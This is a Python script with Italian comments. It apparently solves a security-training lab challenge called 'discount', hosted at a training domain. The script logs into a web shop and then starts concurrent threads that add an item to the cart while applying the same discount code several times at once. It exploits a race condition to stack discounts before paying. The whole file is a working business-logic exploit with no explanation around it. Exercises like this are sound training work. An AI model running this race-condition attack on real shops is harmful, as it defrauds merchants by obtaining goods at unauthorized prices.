import requests
import threading
import random
import string
import time

baseurl="http://discount.training.offdef.it"

def randomString():
    return ''.join(random.sample(string.ascii_letters + string.digits, 10))
        
def login(session,username,password):
    url="%s/login" % baseurl
    data={"username": username, "password": password}
    try:
        r = session.post(url, data=data)
        r.raise_for_status()  # Solleva un'eccezione in caso di errore HTTP
        print("Login con successo!")
        #print("Risposta del server:", r.text)
    except requests.exceptions.RequestException as e:
        print(f"Errore durante l'invio della richiesta: {e}")

def registration(session, username, password):
    url="%s/register" % baseurl
    data={"username": username, "password": password}
    try:
        r = session.post(url, data=data)
        r.raise_for_status()  # Solleva un'eccezione in caso di errore HTTP
        print("Richiesta inviata con successo!")
        print("Risposta del server:", r.text)
    except requests.exceptions.RequestException as e:
        print(f"Errore durante l'invio della richiesta: {e}")

def shop(session):
    url = "%s/shop" % baseurl
    try:
        r = session.get(url)
        r.raise_for_status()  # Solleva un'eccezione in caso di errore HTTP
        print("Shop inviata con successo!")
        
      
    except requests.exceptions.RequestException as e:
        print(f"Errore durante l'invio della richiesta: {e}")


def addToCart(session):
    url = "%s/add_to_cart?item_id=21" % baseurl
    #data={"item_id": item_id}
    try:
        response = session.get(url)
        response.raise_for_status()  # Solleva un'eccezione se c'è un problema con la richiesta HTTP
        print("Add inviata con successo!")
    # Stampa il contenuto della risorsa
        #print(response.text)
    except requests.exceptions.RequestException as e:
        print(f"Errore durante la richiesta HTTP: {e}")


def applyDiscount(session, discount):
    url="%s/apply_discount" % baseurl
    data={"discount": discount}
    try:
        r = session.post(url, data=data)
        r.raise_for_status()  # Solleva un'eccezione in caso di errore HTTP
        print("Discount inviata con successo!")
        print("Risposta del server:", r.text)
    except requests.exceptions.RequestException as e:
        print(f"Errore durante l'invio della richiesta: {e}")             


def showItems(session):
    url = "%s/items" % baseurl
    try:
        r = session.get(url)
        r.raise_for_status()  # Solleva un'eccezione in caso di errore HTTP
        print("ShowItems inviata con successo!")
        print("Risposta del server:", r.text)
      
    except requests.exceptions.RequestException as e:
        print(f"Errore durante l'invio della richiesta: {e}")


def cart(session):
    url = "%s/cart" % baseurl
    try:
        r = session.get(url)
        r.raise_for_status()  # Solleva un'eccezione in caso di errore HTTP
        print("Cart inviata con successo!")
        print("Risposta del server:", r.text)
      
    except requests.exceptions.RequestException as e:
        print(f"Errore durante l'invio della richiesta: {e}")

def pay(session):
    url = "%s/cart/pay" % baseurl
    try:
        r = session.get(url)
        r.raise_for_status()  # Solleva un'eccezione in caso di errore HTTP
        print("pay inviata con successo!")
        print("Risposta del server:", r.text)
      
    except requests.exceptions.RequestException as e:
        print(f"Errore durante l'invio della richiesta: {e}")

s = requests.Session() #  to create session
u="ag"  #ad, ag è quello funzionante
p="ag"  #ad , ag è quello funzionante
item=21
d="5G3CE1CRU7"
#registration(s,u,p)
login(s,u,p)
shop(s)
#addToCart(s)
t1=threading.Thread(target=addToCart , args=(s,))
t2=threading.Thread(target=applyDiscount,  args=(s,d))
t3=threading.Thread(target=applyDiscount,  args=(s,d))
t4=threading.Thread(target=applyDiscount,  args=(s,d))




t1.start()
time.sleep(0.1)
t2.start()
t3.start()
t4.start()




t1.join()
t2.join()
t3.join()
t4.join()



pay(s)
showItems(s)